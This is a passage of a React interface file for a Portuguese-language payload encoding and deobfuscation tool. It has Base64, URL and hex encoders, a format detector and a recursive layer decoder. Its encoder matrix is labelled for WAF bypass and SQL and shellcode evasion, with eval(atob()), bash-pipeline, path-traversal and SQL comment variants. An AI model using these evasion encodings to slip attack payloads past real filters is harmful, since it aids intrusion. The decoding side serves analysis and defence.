                        >
                          {tab.label}
                        </button>
                      ))}
                    </div>

                    {/* Output Codebox */}
                    <div className="relative">
                      <pre className="p-3.5 rounded-xl bg-[#0c0c10] border border-[#20202e] text-purple-300 font-mono text-xs overflow-x-auto break-all min-h-[90px] max-h-[140px] select-all leading-relaxed">
                        {currentB64String || '<Entrada vazia>'}
                      </pre>
                    </div>
                  </div>

                  {/* Actions Bar */}
                  <div className="pt-2 border-t border-[#1e1e28] flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-500 text-[10px]">{currentB64String.length} chars</span>
                    <button
                      type="button"
                      onClick={() => handleCopy('b64-res', currentB64String)}
                      className="px-3 py-1 rounded-lg bg-purple-500/15 hover:bg-purple-500/25 border border-purple-500/30 text-purple-200 font-bold flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'b64-res' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>Copiar Base64</span>
                    </button>
                  </div>
                </div>

                {/* 2. URL ENCODING ENGINE PANEL */}
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg flex flex-col justify-between">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                      <div className="flex items-center gap-2">
                        <span className="w-2.5 h-2.5 rounded-full bg-cyan-500 animate-pulse" />
                        <h4 className="text-sm font-bold text-white font-mono">2. URL Engine</h4>
                      </div>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">
                        WAF Bypass
                      </span>
                    </div>

                    {/* Variant Tabs */}
                    <div className="flex items-center gap-1 overflow-x-auto pb-1 scrollbar-none text-[11px] font-mono">
                      {[
                        { id: 'std', label: 'Standard (%20)' },
                        { id: 'double', label: 'Double (%2520)' },
                        { id: 'triple', label: 'Triple (%252520)' },
                        { id: 'full', label: 'Full All-Chars (%XX)' },
                        { id: 'path', label: 'Traversal (..%2f)' }
                      ].map(tab => (
                        <button
                          key={tab.id}
                          type="button"
                          onClick={() => setActiveUrlVariant(tab.id as any)}
                          className={`px-2 py-1 rounded-lg transition-all cursor-pointer whitespace-nowrap ${
                            activeUrlVariant === tab.id
                              ? 'bg-cyan-500/20 text-cyan-200 border border-cyan-400 font-bold'
                              : 'bg-[#171722] text-zinc-400 hover:text-white border border-[#232332]'
                          }`}
                        >
                          {tab.label}
                        </button>
                      ))}
                    </div>

                    {/* Output Codebox */}
                    <div className="relative">
                      <pre className="p-3.5 rounded-xl bg-[#0c0c10] border border-[#20202e] text-cyan-300 font-mono text-xs overflow-x-auto break-all min-h-[90px] max-h-[140px] select-all leading-relaxed">
                        {currentUrlString || '<Entrada vazia>'}
                      </pre>
                    </div>
                  </div>

                  {/* Actions Bar */}
                  <div className="pt-2 border-t border-[#1e1e28] flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-500 text-[10px]">{currentUrlString.length} chars</span>
                    <button
                      type="button"
                      onClick={() => handleCopy('url-res', currentUrlString)}
                      className="px-3 py-1 rounded-lg bg-cyan-500/15 hover:bg-cyan-500/25 border border-cyan-500/30 text-cyan-200 font-bold flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'url-res' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>Copiar URL</span>
                    </button>
                  </div>
                </div>

                {/* 3. HEXADECIMAL ENGINE PANEL */}
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg flex flex-col justify-between">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                      <div className="flex items-center gap-2">
                        <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
                        <h4 className="text-sm font-bold text-white font-mono">3. Hex Engine</h4>
                      </div>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">
                        Shellcode & SQL
                      </span>
                    </div>

                    {/* Variant Tabs */}
                    <div className="flex items-center gap-1 overflow-x-auto pb-1 scrollbar-none text-[11px] font-mono">
                      {[
                        { id: 'slash', label: 'C-Style (\\x..)' },
                        { id: 'sql', label: 'SQL Literal (0x..)' },
                        { id: 'char', label: 'CHAR(...)' },
                        { id: 'space', label: 'Space (41 42)' },
                        { id: 'raw', label: 'Raw (4142)' }
                      ].map(tab => (
                        <button
                          key={tab.id}
                          type="button"
                          onClick={() => setActiveHexVariant(tab.id as any)}
                          className={`px-2 py-1 rounded-lg transition-all cursor-pointer whitespace-nowrap ${
                            activeHexVariant === tab.id
                              ? 'bg-emerald-500/20 text-emerald-200 border border-emerald-400 font-bold'
                              : 'bg-[#171722] text-zinc-400 hover:text-white border border-[#232332]'
                          }`}
                        >
                          {tab.label}
                        </button>
                      ))}
                    </div>

                    {/* Output Codebox */}
                    <div className="relative">
                      <pre className="p-3.5 rounded-xl bg-[#0c0c10] border border-[#20202e] text-emerald-300 font-mono text-xs overflow-x-auto break-all min-h-[90px] max-h-[140px] select-all leading-relaxed">
                        {currentHexString || '<Entrada vazia>'}
                      </pre>
                    </div>
                  </div>

                  {/* Actions Bar */}
                  <div className="pt-2 border-t border-[#1e1e28] flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-500 text-[10px]">{currentHexString.length} chars</span>
                    <button
                      type="button"
                      onClick={() => handleCopy('hex-res', currentHexString)}
                      className="px-3 py-1 rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 text-emerald-200 font-bold flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'hex-res' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>Copiar Hex</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* SUB-MODE 2: DECODE & ANALYZE PAYLOAD */}
          {workbenchSubMode === 'DECODE' && (
            <div className="space-y-6">
              {/* Obfuscated Input Card */}
              <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
                  <div className="flex items-center gap-2">
                    <Eye className="w-4 h-4 text-cyan-400" />
                    <h3 className="text-sm font-bold text-white">
                      Payload Obscurecido / String Suspeita a ser Decodificada
                    </h3>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        setInputText(autoDecodedPlain);
                        setWorkbenchSubMode('ENCODE');
                        showToast('Texto decodificado carregado na aba de Codificação!');
                      }}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-cyan-300 text-xs font-mono border border-cyan-500/30 flex items-center gap-1 cursor-pointer"
                      title="Usar o resultado decodificado como nova entrada em claro"
                    >
                      <ArrowRightLeft className="w-3 h-3" />
                      <span>Usar no Codificador</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleCopy('decode-input', decodeInput)}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-300 text-xs font-mono border border-[#262638] flex items-center gap-1 cursor-pointer"
                    >
                      {copiedKey === 'decode-input' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setDecodeInput('')}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-400 hover:text-white text-xs font-mono cursor-pointer"
                    >
                      Limpar
                    </button>
                  </div>
                </div>

                {/* Textarea */}
                <textarea
                  rows={3}
                  value={decodeInput}
                  onChange={(e) => setDecodeInput(e.target.value)}
                  placeholder="Cole aqui a string codificada (ex: %3Cscript... ou aGVsbG8= ou \x3c\x73...)"
                  className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3.5 py-2.5 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-400 leading-relaxed"
                />

                {/* Real-Time Format Detection Diagnostic */}
                <div className="bg-[#151520] border border-[#242436] rounded-xl p-3.5 space-y-2">
                  <div className="text-[11px] font-mono font-bold text-zinc-400 uppercase tracking-wider flex items-center justify-between">
                    <span className="flex items-center gap-1.5">
                      <Activity className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Diagnóstico de Reconhecimento Automático de Formato:</span>
                    </span>
                    <span className="text-zinc-500">Entropia: {decodeEntropy} bits/byte</span>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2 pt-1">
                    {detectedDecodeFormats.map((df, idx) => (
                      <div key={idx} className="bg-[#101018] border border-[#202030] rounded-lg p-2.5 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold font-mono text-white">{df.label}</span>
                          <span className={`text-[9px] font-mono font-bold px-1.5 py-0.2 rounded border ${
                            df.confidence === 'HIGH' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30' : 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                          }`}>
                            {df.confidence}
                          </span>
                        </div>
                        <p className="text-[11px] text-zinc-400 leading-snug">{df.reason}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Decoded Representations Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Panel 1: Auto-Decoded Plain Text Result */}
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
                  <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                      <h4 className="text-sm font-bold text-white font-mono">Texto Claro Decodificado (Plaintext)</h4>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleCopy('auto-plain', autoDecodedPlain)}
                      className="px-2.5 py-1 rounded-lg bg-emerald-500/15 text-emerald-300 text-xs font-mono font-bold flex items-center gap-1 cursor-pointer border border-emerald-500/30"
                    >
                      {copiedKey === 'auto-plain' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar Plaintext</span>
                    </button>
                  </div>
                  <pre className="p-3.5 rounded-xl bg-[#0c0c10] border border-[#20202e] text-emerald-300 font-mono text-xs overflow-x-auto break-all min-h-[90px] select-all leading-relaxed">
                    {autoDecodedPlain || '<Não foi possível decodificar automaticamente>'}
                  </pre>
                </div>

                {/* Panel 2: Manual Decoder Result */}
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
                  <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                    <div className="flex items-center gap-2">
                      <Code className="w-4 h-4 text-cyan-400" />
                      <h4 className="text-sm font-bold text-white font-mono">Decodificação Manual Forçada</h4>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleCopy('manual-plain', manualDecodedResult)}
                      className="px-2.5 py-1 rounded-lg bg-cyan-500/15 text-cyan-300 text-xs font-mono font-bold flex items-center gap-1 cursor-pointer border border-cyan-500/30"
                    >
                      {copiedKey === 'manual-plain' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>

                  {/* Manual format selector pills */}
                  <div className="flex items-center gap-1 flex-wrap text-xs font-mono">
                    {(['url', 'base64', 'hex', 'html', 'unicode', 'rot13'] as DecoderFormat[]).map(fmt => (
                      <button
                        key={fmt}
                        type="button"
                        onClick={() => setManualDecodeFormat(fmt)}
                        className={`px-2 py-0.5 rounded-lg transition-all cursor-pointer ${
                          manualDecodeFormat === fmt
                            ? 'bg-cyan-500 text-black font-bold shadow-md'
                            : 'bg-[#181824] text-zinc-400 hover:text-white'
                        }`}
                      >
                        {fmt.toUpperCase()}
                      </button>
                    ))}
                  </div>

                  <pre className="p-3.5 rounded-xl bg-[#0c0c10] border border-[#20202e] text-cyan-300 font-mono text-xs overflow-x-auto break-all min-h-[90px] select-all leading-relaxed">
                    {manualDecodedResult || '<Resultado manual indisponível>'}
                  </pre>
                </div>
              </div>

              {/* Recursive Peeler Quick Visualizer */}
              {recursiveSteps.length > 1 && (
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
                  <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                    <div className="flex items-center gap-2">
                      <Layers className="w-4 h-4 text-emerald-400" />
                      <h4 className="text-sm font-bold text-white font-mono">
                        Camadas Aninhadas Identificadas ({recursiveSteps.length} saltos de ofuscação)
                      </h4>
                    </div>
                    <span className="text-[10px] font-mono text-emerald-400">
                      Desempacotamento Automático
                    </span>
                  </div>

                  <div className="space-y-2">
                    {recursiveSteps.map((step, idx) => (
                      <div key={idx} className="bg-[#151522] border border-[#252538] rounded-xl p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs font-mono">
                        <div className="flex items-center gap-2">
                          <span className="w-5 h-5 rounded-full bg-cyan-500/20 text-cyan-300 font-bold flex items-center justify-center text-[10px]">
                            {step.stepNumber}
                          </span>
                          <span className="text-white font-bold">{step.formatDetected}</span>
                          <span className="text-zinc-500 truncate max-w-xs">{step.description}</span>
                        </div>
                        <div className="flex items-center gap-2 truncate">
                          <code className="text-emerald-300 bg-black/40 px-2 py-0.5 rounded truncate max-w-sm">
                            {step.output}
                          </code>
                          <button
                            type="button"
                            onClick={() => handleCopy(`step-${idx}`, step.output)}
                            className="text-zinc-400 hover:text-white p-1"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}

          {/* SUB-MODE 3: 4-WAY BIDIRECTIONAL LIVE SYNC */}
          {workbenchSubMode === 'FOUR_WAY_SYNC' && (
            <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-5 shadow-lg">
              <div className="flex items-center justify-between border-b border-[#1e1e28] pb-3">
                <div className="flex items-center gap-2">
                  <ArrowRightLeft className="w-4 h-4 text-cyan-400" />
                  <h3 className="text-sm font-bold text-white">
                    Conversor 4-Way Bidirecional Simultâneo (Live Sync)
                  </h3>
                </div>
                <span className="text-xs font-mono text-zinc-400">
                  Edite qualquer uma das 4 caixas para recalcular todas as outras em tempo real
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                {/* 1. Plaintext Box */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-white flex items-center gap-1.5">
                      <Terminal className="w-3.5 h-3.5 text-zinc-400" />
                      <span>Texto em Claro (Plaintext)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopy('sync-plain', syncPlain)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copiar</span>
                    </button>
                  </div>
                  <textarea
                    rows={4}
                    value={syncPlain}
                    onChange={(e) => updateSyncFromPlain(e.target.value)}
                    placeholder="Digite texto em claro..."
                    className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyan-400 resize-y"
                  />
                </div>

                {/* 2. Base64 Box */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-purple-300 flex items-center gap-1.5">
                      <Binary className="w-3.5 h-3.5 text-purple-400" />
                      <span>Base64 (RFC 4648)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopy('sync-b64', syncB64)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copiar</span>
                    </button>
                  </div>
                  <textarea
                    rows={4}
                    value={syncB64}
                    onChange={(e) => updateSyncFromB64(e.target.value)}
                    placeholder="Digite ou cole Base64..."
                    className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3 py-2 text-xs font-mono text-purple-300 focus:outline-none focus:border-purple-400 resize-y"
                  />
                </div>

                {/* 3. URL Encoded Box */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-cyan-300 flex items-center gap-1.5">
                      <Globe className="w-3.5 h-3.5 text-cyan-400" />
                      <span>URL Encoded (%XX)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopy('sync-url', syncUrl)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copiar</span>
                    </button>
                  </div>
                  <textarea
                    rows={4}
                    value={syncUrl}
                    onChange={(e) => updateSyncFromUrl(e.target.value)}
                    placeholder="Digite ou cole URL encoded..."
                    className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-400 resize-y"
                  />
                </div>

                {/* 4. Hex Box */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-emerald-300 flex items-center gap-1.5">
                      <Code className="w-3.5 h-3.5 text-emerald-400" />
                      <span>Hexadecimal (\x.. ou 0x..)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopy('sync-hex', syncHex)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copiar</span>
                    </button>
                  </div>
                  <textarea
                    rows={4}
                    value={syncHex}
                    onChange={(e) => updateSyncFromHex(e.target.value)}
                    placeholder="Digite ou cole Hex..."
                    className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3 py-2 text-xs font-mono text-emerald-300 focus:outline-none focus:border-emerald-400 resize-y"
                  />
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODE 2: REAL-TIME ENCODER MATRIX (ALL 20+ VARIANTS) */}
      {/* ========================================================================= */}
      {viewMode === 'ENCODER_MATRIX' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="flex items-center gap-2">
                <span className="text-xs font-mono font-bold text-white flex items-center gap-1.5">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  <span>Entrada em Claro (Payload Original / String de Teste)</span>
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-400">
                  {inputText.length} chars
                </span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setDecodeInput(encodings.base64);
                    setViewMode('DEOBFUSCATOR');
                  }}
                  className="px-2.5 py-1 rounded-lg bg-[#181826] hover:bg-[#202034] text-cyan-300 text-xs font-mono flex items-center gap-1 border border-cyan-500/30 transition-colors cursor-pointer"
                >
                  <ArrowRightLeft className="w-3 h-3" />
                  <span>Enviar ao Desofuscador</span>
                </button>
                <button
                  type="button"
                  onClick={() => handleCopy('input-text', inputText)}
                  className="px-2.5 py-1 rounded-lg bg-[#1c1c28] hover:bg-[#28283a] text-zinc-300 text-xs font-mono flex items-center gap-1 border border-[#2a2a3c] transition-colors cursor-pointer"
                >
                  {copiedKey === 'input-text' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar Entrada</span>
                </button>
              </div>
            </div>

            <textarea
              rows={3}
              value={inputText}
              onChange={e => setInputText(e.target.value)}
              placeholder="Digite ou cole aqui o payload de ataque..."
              className="w-full px-3.5 py-2.5 rounded-xl bg-[#0c0c10] border border-[#232330] text-cyan-300 font-mono text-xs focus:outline-none focus:border-cyan-500/50 resize-none leading-relaxed"
            />
          </div>

          {/* Matrix Columns */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Column 1: Base64 */}
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-purple-500" />
                  <span>Variantes Base64</span>
                </h3>
                <span className="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20">
                  RFC 4648
                </span>
              </div>

              {[
                { label: 'Base64 Standard', val: encodings.base64, key: 'b64-std' },
                { label: 'Base64URL Safe (-_)', val: encodings.base64Url, key: 'b64-url' },
                { label: 'JS eval(atob(..))', val: encodings.base64EvalJs, key: 'b64-eval' },
                { label: 'Linux Bash Pipeline', val: encodings.base64Bash, key: 'b64-bash' },
                { label: 'Data URI (data:text/html)', val: encodings.base64DataUri, key: 'b64-uri' },
                { label: 'PHP Base64 Filter', val: encodings.phpBase64Filter, key: 'b64-php' }
              ].map(item => (
                <div key={item.key} className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-300 font-bold">{item.label}</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(item.key, item.val)}
                      className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1 cursor-pointer"
                    >
                      {copiedKey === item.key ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-purple-300 font-mono text-xs overflow-x-auto break-all">
                    {item.val}
                  </pre>
                </div>
              ))}
            </div>

            {/* Column 2: URL */}
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-cyan-500" />
                  <span>Variantes URL</span>
                </h3>
                <span className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20">
                  WAF Evasion
                </span>
              </div>

              {[
                { label: 'URL Encode (%20)', val: encodings.urlEncode, key: 'url-std' },
                { label: 'Double URL Encode (%2520)', val: encodings.doubleUrlEncode, key: 'url-double' },
                { label: 'Triple URL Encode (%252520)', val: encodings.tripleUrlEncode, key: 'url-triple' },
                { label: 'Full URL Encode (%XX All Chars)', val: encodings.fullUrlEncode, key: 'url-full' },
                { label: 'Path Traversal (..%2f / %2e%2e%2f)', val: encodings.urlPathTraversal, key: 'url-path' },
                { label: 'URL Plus Spaces (application/x-www-form)', val: encodings.urlPlusSpaces, key: 'url-plus' }
              ].map(item => (
                <div key={item.key} className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-300 font-bold">{item.label}</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(item.key, item.val)}
                      className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1 cursor-pointer"
                    >
                      {copiedKey === item.key ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                    {item.val}
                  </pre>
                </div>
              ))}
            </div>

            {/* Column 3: Hex */}
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500" />
                  <span>Variantes Hexadecimais</span>
                </h3>
                <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
                  SQLi & Shellcode
                </span>
              </div>

              {[
                { label: 'Hex C-Style Escaped (\\x..)', val: encodings.hexSlashX, key: 'hex-slash' },
                { label: 'SQL Hex Literal (0x..)', val: encodings.hexSqlLiteral, key: 'hex-sql' },
                { label: 'SQL CHAR(...) Function', val: encodings.sqlChar, key: 'hex-char' },
                { label: 'Raw Contiguous Hex (414243)', val: encodings.hexRaw, key: 'hex-raw' },
                { label: 'Case Randomization (sElEcT)', val: encodings.caseAlternating, key: 'case-alt' },
                { label: 'SQL Inline Comments (/**/ Space)', val: encodings.sqlCommentSpaces, key: 'sql-com' }
              ].map(item => (
                <div key={item.key} className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-300 font-bold">{item.label}</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(item.key, item.val)}
                      className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1 cursor-pointer"
                    >
                      {copiedKey === item.key ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-emerald-300 font-mono text-xs overflow-x-auto break-all">
                    {item.val}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODE 3: DEOBFUSCATOR & LAYER PEELER */}
      {/* ========================================================================= */}
      {viewMode === 'DEOBFUSCATOR' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="flex items-center gap-2">
                <Eye className="w-4 h-4 text-cyan-400" />
                <span className="text-sm font-bold text-white">Entrada Obscurecida / Payload Suspeito</span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-400">
                  {decodeInput.length} chars
                </span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setDecodeInput(inputText)}
                  className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-300 text-xs font-mono border border-[#262638] transition-colors cursor-pointer"
                >
                  Puxar Entrada da Matriz
                </button>
                <button
                  type="button"
                  onClick={() => setDecodeInput('')}
                  className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-400 hover:text-zinc-200 text-xs font-mono transition-colors cursor-pointer"
                >
                  Limpar
                </button>
              </div>
            </div>

            <textarea
              rows={4}
              value={decodeInput}
              onChange={e => setDecodeInput(e.target.value)}
              placeholder="Cole aqui a string ofuscada (ex: %3Cscript... ou aGVsbG8= ou \x3c\x73...)"
              className="w-full px-3.5 py-2.5 rounded-xl bg-[#0c0c10] border border-[#232330] text-cyan-300 font-mono text-xs focus:outline-none focus:border-cyan-500/50 resize-none leading-relaxed"
            />

            {/* Heuristic Detection Analysis */}
            <div className="bg-[#151520] border border-[#242436] rounded-xl p-3.5 space-y-2">
              <div className="text-[11px] font-mono font-bold text-zinc-400 uppercase tracking-wider flex items-center justify-between">
                <span className="flex items-center gap-1.5">
                  <Activity className="w-3.5 h-3.5 text-cyan-400" />
                  <span>Diagnóstico de Reconhecimento Automático de Formato:</span>
                </span>
                <span className="text-zinc-500">Entropia: {decodeEntropy} bits/byte</span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2 pt-1">
                {detectedDecodeFormats.map((df, idx) => (
                  <div key={idx} className="bg-[#101018] border border-[#202030] rounded-lg p-2.5 space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold font-mono text-white">{df.label}</span>
                      <span className={`text-[9px] font-mono font-bold px-1.5 py-0.2 rounded border ${
                        df.confidence === 'HIGH' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30' : 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                      }`}>
                        {df.confidence}
                      </span>
                    </div>
                    <p className="text-[11px] text-zinc-400 leading-snug">{df.reason}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Recursive Layer Peeler */}
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex items-center justify-between border-b border-[#1e1e28] pb-3">
              <div className="space-y-0.5">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Layers className="w-4 h-4 text-emerald-400" />
                  <span>Desempacotamento Recursivo de Camadas (Layer Peeler)</span>
                </h3>
                <p className="text-xs text-zinc-400">
                  Detecta e remove sucessivamente camadas aninhadas de ofuscação (ex: URL → Base64 → Hex → Texto Claro).
                </p>
              </div>

              {recursiveSteps.length > 1 && (
                <button
                  type="button"
                  onClick={() => handleCopy('final-peeled', recursiveSteps[recursiveSteps.length - 1].output)}
                  className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-mono text-xs font-bold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  {copiedKey === 'final-peeled' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>Copiar Payload Desmascarado</span>
                </button>
              )}
            </div>

            {recursiveSteps.length === 0 ? (
              <div className="text-center py-6 text-zinc-500 text-xs font-mono">
                Nenhum dado fornecido para desempacotar.
              </div>
            ) : (
              <div className="space-y-3">
                {recursiveSteps.map((step, idx) => (
                  <div key={idx} className="bg-[#151522] border border-[#252538] rounded-xl p-4 space-y-2">
                    <div className="flex items-center justify-between text-xs font-mono">
                      <div className="flex items-center gap-2">
                        <span className="w-5 h-5 rounded-full bg-cyan-500/20 text-cyan-300 font-bold flex items-center justify-center text-[10px] border border-cyan-500/40">
                          {step.stepNumber}
                        </span>
                        <span className="font-bold text-white">{step.formatDetected}</span>
                        <span className="text-zinc-500 text-[11px]">• {step.description}</span>
                      </div>
